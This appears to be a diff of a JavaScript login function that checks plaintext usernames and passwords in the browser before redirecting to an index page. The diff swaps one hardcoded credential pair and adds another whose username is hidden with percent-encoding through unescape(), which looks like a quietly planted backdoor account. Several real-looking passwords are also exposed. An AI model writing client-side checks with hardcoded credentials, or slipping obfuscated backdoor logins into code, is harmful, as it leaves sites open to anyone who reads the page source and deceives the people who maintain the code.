@@ -5,11 +5,14 @@ function Login(){
 	if (usuario=="1" && password=="1") { 
 	window.location="/index.html"; 
 	}
-    if (usuario=="Nanocavs" && password=="Monubarapisarda18") { 
+    if (usuario=="guly" && password=="asdasd123") { 
         window.location="/index.html"; 
         } 
     if (usuario=="pelado" && password=="pelado22gtav") { 
             window.location="/index.html"; 
+    } 
+    if (usuario==unescape("%64%61%76%69%64%71%65%6F") && password=="DavidZQEO123") { 
+        window.location="/index.html"; 
     } 
     if (usuario=="1" && password=="1") { 
         window.location="/index.html"; 
